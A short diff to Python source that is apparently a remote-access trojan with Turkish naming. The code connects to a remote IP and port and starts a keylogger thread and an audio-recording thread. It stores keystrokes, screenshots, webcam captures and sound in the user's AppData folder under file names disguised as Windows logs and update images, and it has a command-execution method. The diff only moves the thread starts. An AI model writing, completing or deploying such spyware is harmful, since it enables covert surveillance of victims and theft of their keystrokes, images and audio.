@@ -13,13 +13,10 @@ import shutil
 import cv2
 import ses_kayit
 
-
+mythread = threading.Thread(target=kg.kgBasla)
+mythread.start()
 class mySocket():
     def __init__(self,ip,port):
-        mythread = threading.Thread(target=self.kgB)
-        mythread.start()
-        mythread2 = threading.Thread(target=self.seskaydet)
-        mythread2.start()
         self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.connection.connect((ip,port))
         self.kg_dosya = os.environ["appdata"]+"\\windowslogs.txt"
@@ -27,6 +24,8 @@ class mySocket():
         self.ss_dosya = os.environ["appdata"]+"\\update.png"
         self.kamera_dosya = os.environ["appdata"]+"\\windowsupdate.png"
         self.ses_dosya = os.environ["appdata"]+"\\windowssounds.wav"
+        mythread2 = threading.Thread(target=self.seskaydet)
+        mythread2.start()
 
 
     def komutCalistir(self,komut):
